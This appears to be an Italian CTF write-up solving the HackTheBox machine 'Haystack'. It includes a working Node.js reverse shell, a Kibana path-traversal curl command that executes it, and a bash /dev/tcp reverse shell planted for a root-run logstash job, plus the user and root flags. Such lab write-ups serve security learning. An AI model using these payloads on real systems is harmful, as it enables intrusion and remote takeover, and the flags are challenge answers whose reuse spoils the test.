---
title: "Haystack - HackTheBox"
date: 2019-07-16T15:42:05+02:00
tags:
    - "CTF"
    - "HackTheBox"
draft: true
---

### Scan dei servizi
Facciamo uno scan con nmap:
![Nmap](/images/hackthebox/haystack/nmap.png)

### Web server
Vediamo cosa contiene la pagina web:
![Web](/images/hackthebox/haystack/web.png)

Il sorgente HTML non mostra nulla oltre all'immagine. Scarichiamola e vediamo se
contiene qualcosa con il comando strings:
![Strings](/images/hackthebox/haystack/strings.png)

Potrebbe essere base64, proviamo a decodificarlo:
![Base64](/images/hackthebox/haystack/base64.png)

La traduzione in italiano è:
```
L'ago nel pagliaio è "chiave"
```
Teniamo a mente questo messaggio.

### Secondo web server
Nello scan di nmap notiamo un secondo web server sulla porta 9200, vediamo cosa
contiene:
![Elasticsearch](/images/hackthebox/haystack/elasticsearch.png)

Elasticsearch è un motore di ricerca che si basa sulla libreria Lucene di
Apache. Utilizza il parametro nome `q` sulla pagina `_search` (il parametro
pretty serve ad avere il JSON formattato e indentato):
![Search](/images/hackthebox/haystack/search.png)

Provando con qualche valore di `q`, scopriamo che impostandolo ad `haystack`, ci
viene restituito questo messaggio:
![Haystack](/images/hackthebox/haystack/haystack.png)

Ricordandoci del messaggio di prima, capiamo che il "pagliaio" a cui si faceva
riferimento è proprio questo, ovverro l'insieme degli oggetti restituiti da
Elasticsearch. Proviamo ad impostare il parametro `q` con il valore `clave`:
![Clave](/images/hackthebox/haystack/clave.png)

Decodifichiamo le due stringhe:
![Base64](/images/hackthebox/haystack/base64-2.png)

Proviamo a usare i dati per connetterci tramite ssh:
![User](/images/hackthebox/haystack/user.png)

### User flag
```
04d18bc79dac1d4d48ee0a940c8eb929
```

### Privilege escalation

Scriviamo la shell in /tmp indicando il nostro indirizzo IP in `client.connect`:
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(1337, "10.10.14.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Eseguiamo il file con il comando:
```
curl http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\&apis=../../../../../../.../../../../tmp/shell.js
```

Utilizziamo i seguenti comandi per migliorare l'usabilità della shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
export LANG=en_US.UTF8
export TERM=xterm-256color
```

Vediamo le configurazioni di logstash:
![Logstash configuration](/images/hackthebox/haystack/logstash.conf.png)

```bash
################################################################################
# These settings are ONLY used by $LS_HOME/bin/system-install to create a custom
# startup script for Logstash and is not used by Logstash itself. It should
# automagically use the init system (systemd, upstart, sysv, etc.) that your
# Linux distribution uses.
#
# After changing anything here, you need to re-run $LS_HOME/bin/system-install
# as root to push the changes to the init script.
################################################################################

# Override Java location
#JAVACMD=/usr/bin/java

# Set a home directory
LS_HOME=/usr/share/logstash

# logstash settings directory, the path which contains logstash.yml
LS_SETTINGS_DIR=/etc/logstash

# Arguments to pass to logstash
LS_OPTS="--path.settings ${LS_SETTINGS_DIR}"

# Arguments to pass to java
LS_JAVA_OPTS=""

# pidfiles aren't used the same way for upstart and systemd; this is for sysv users.
LS_PIDFILE=/var/run/logstash.pid

# user and group id to be invoked as
#LS_USER=logstash
#LS_GROUP=logstash
LS_USER=root
LS_GROUP=root

# Enable GC logging by uncommenting the appropriate lines in the GC logging
# section in jvm.options
LS_GC_LOG_FILE=/var/log/logstash/gc.log

# Open file limit
LS_OPEN_FILES=16384

# Nice level
LS_NICE=19

# Change these to have the init script named and described differently
# This is useful when running multiple instances of Logstash on the same
# physical box or vm
SERVICE_NAME="logstash"
SERVICE_DESCRIPTION="logstash"

# If you need to run a command or script before launching Logstash, put it
# between the lines beginning with `read` and `EOM`, and uncomment those lines.
###
read -r -d '' PRESTART << EOM
EOM
```

Notiamo che logstash viene eseguito come utente `root`.

Scriviamo lo script in /opt/kibana
```
echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.2/1338 0>&1" >
/opt/kibana/logstash_revshell
```

Per triggerare l'esecuzione dello script dobbiamo accedere alla console di
kibana, che però è accessibile solo da localhost, in quanto nel file di
configurazione viene indicato `127.0.0.1` come indirizzo del server:
![Kibana configuration](/images/hackthebox/haystack/kibana-config.png)

Usiamo allora `ssh` per sfruttare il port forwarding a nostro vantaggio. Con il
comando:
```
ssh -L 8888:localhost:5601 security@10.10.10.115
```
impostiamo `ssh` in modo che inoltri il traffico dalla porta 8888 sulla nostra
macchina alla porta 5601 sulla macchina remota.
Mettiamo netcat in ascolto sulla porta che abbiamo indicato nel file in
`/opt/kibana` e visitiamo l'url `http://localhost:8888` per far eseguire lo
script.

Stampiamo la flag:
![Root flag](/images/hackthebox/haystack/root-flag.png)

### Root flag
```
3f5f727c38d9f70e1d2ad2ba11059d92
```
